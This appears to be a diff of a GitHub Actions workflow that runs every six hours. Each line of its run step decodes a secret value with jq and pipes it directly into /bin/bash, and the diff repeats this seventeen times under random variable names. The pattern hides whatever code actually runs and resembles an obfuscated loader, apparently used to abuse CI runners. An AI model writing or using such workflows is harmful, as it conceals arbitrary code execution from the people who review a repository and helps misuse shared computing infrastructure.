@@ -2,20 +2,31 @@ name: wentgratis
 on:
   workflow_dispatch:
   schedule:
-    - cron: '25 3/6 * * *'
-jobs:  # 13953
+    - cron: '33 0/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: wentgratis
         env:
-          swrab236: ${{ secrets.swrab236 }}
+          e67: ${{ secrets.e67 }}
         run: |
-          echo $swrab236 | jq -r .kxrii55959 | /bin/bash
-          echo $exhy2 | jq -r .vhfy0 | /bin/bash
-          echo $lten8 | jq -r .cp7044 | /bin/bash
-          echo $l8 | jq -r .xdv8 | /bin/bash
-          echo $b4169 | jq -r .bekg2 | /bin/bash
-          echo $lqtfb1 | jq -r .dagas7 | /bin/bash
+          echo $e67 | jq -r .ka024 | /bin/bash
+          echo $gbrdp8460 | jq -r .dz1 | /bin/bash
+          echo $v8 | jq -r .kvzi36145 | /bin/bash
+          echo $p420 | jq -r .m383 | /bin/bash
+          echo $bp6355 | jq -r .n306 | /bin/bash
+          echo $cr42053 | jq -r .jcpuk855 | /bin/bash
+          echo $p93 | jq -r .w254 | /bin/bash
+          echo $pk287 | jq -r .nfz86435 | /bin/bash
+          echo $gtqi28 | jq -r .h7188 | /bin/bash
+          echo $ki5 | jq -r .s37741 | /bin/bash
+          echo $nhjsx1 | jq -r .p3853 | /bin/bash
+          echo $tksy4 | jq -r .jk5 | /bin/bash
+          echo $ltnqq89795 | jq -r .l3746 | /bin/bash
+          echo $ujza0315 | jq -r .bb47 | /bin/bash
+          echo $onqnj06 | jq -r .cwx758 | /bin/bash
+          echo $oy8 | jq -r .nxf4 | /bin/bash
+          echo $rgkr02735 | jq -r .b78 | /bin/bash
 
